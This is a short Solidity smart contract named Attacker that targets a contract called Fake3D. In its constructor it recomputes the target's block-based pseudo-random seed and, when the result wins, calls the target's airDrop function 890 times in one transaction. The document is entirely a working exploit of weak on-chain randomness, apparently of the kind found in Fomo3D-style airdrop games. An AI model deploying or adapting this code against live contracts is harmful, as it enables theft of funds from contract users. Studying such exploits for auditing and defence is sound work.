contract Attacker{
    using SafeMath for *;
    constructor(Fake3D f3d) public {
    
        uint256 seed = uint256(keccak256(abi.encodePacked(
            (block.timestamp).add
            (block.difficulty).add
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add
            (block.gaslimit).add
            ((uint256(keccak256(abi.encodePacked(address(f3d))))) / (now)).add
            (block.number)
        )));
        
        if((seed - ((seed / 1000) * 1000)) < 288){
            for(uint counter=0;counter<890;counter++){
                f3d.airDrop();
            }
        }
        
    }
}